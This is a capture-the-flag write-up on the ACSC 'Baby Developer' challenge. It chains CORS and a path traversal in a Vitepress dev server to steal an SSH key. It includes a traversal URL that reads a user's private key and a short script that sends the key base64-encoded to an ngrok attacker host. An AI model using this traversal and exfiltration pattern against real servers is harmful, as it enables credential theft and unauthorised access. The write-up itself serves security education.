---
description: >-
  Directory traversal in insecure Vitepress development server leads to
  information disclosure through SSRF
---

# Baby Developer

## Description

I made a mobile \(apple watch miniminimini series 1337\) viewer on my personal server.

* `http://baby-developer.chal.acsc.asia:8888/`
* `ssh baby-developer.chal.acsc.asia -p2222`

{% file src="../../.gitbook/assets/baby-developer.tar.gz\_f5f00919ccc94f797a24d1a823a61773.gz" caption="Challenge Files" %}

## Solution

* There is a `genflag` server which you are supposed to SSRF
* However, the remote address and user agent are checked so you can't do it directly from `mobile-viewer`
* The pages are rendered as screenshots

```python
@app.route('/flag')
def hello_world():
    if request.remote_addr == dev and 'iPhone' not in request.headers.get('User-Agent'):
        fp = open('/flag', 'r')
        flag = fp.read()
        return flag
    else:
        return "Nope.."
```

From `mobile-viewer`, we need to request `http://genflag/flag` from `website`. This can be done from `/home/stypr/readflag` on `website`.

```text
# Challenge: get flag!
RUN touch /home/stypr/.hushlogin && \
    echo '#include <stdio.h>\r\n#include <stdlib.h>\r\nint main(){FILE *fp;char flag[1035];fp = popen("/usr/bin/curl -s http://genflag/flag", "r");if (fp == NULL) {printf("Error found. Please contact administrator.");exit(1);}while (fgets(flag, sizeof(flag), fp) != NULL) {printf("%s", flag);}pclose(fp);return 0;}' > /home/stypr/readflag.c && \
    gcc -o /home/stypr/readflag /home/stypr/readflag.c && \
    chmod +x /home/stypr/readflag && rm -rf /home/stypr/readflag.c
```

Refer to the [website source](https://github.com/stypr/harold.kim/blob/main/package.json). The `website` server runs `yarn dev`, which runs `vitepress dev src`.

Vitepress is run on dev mode. I found that this enables CORS, allowing us to perform a CSRF to exfiltrate data. Furthermore, I found that there was a path traversal vulnerability, allowing us to get the SSH key: `http://website/../../../../../home/stypr/.ssh/id_rsa`

From `mobile-viewer`, we can make a request to our attacker site, which contains:

```markup
<script>
    fetch("http://website/../../../../../home/stypr/.ssh/id_rsa")
    .then(resp => resp.text())
    .then(data => fetch('http://0db7-115-66-195-39.ngrok.io/?' + btoa(data)))
</script>
```

Get the private key and SSH into the server to get the flag:

```text
$ ssh stypr@baby-developer.chal.acsc.asia -p2222 -i id_rsa 
ACSC{weird_bugs_pwned_my_system_too_late_to_get_my_CVE}
```

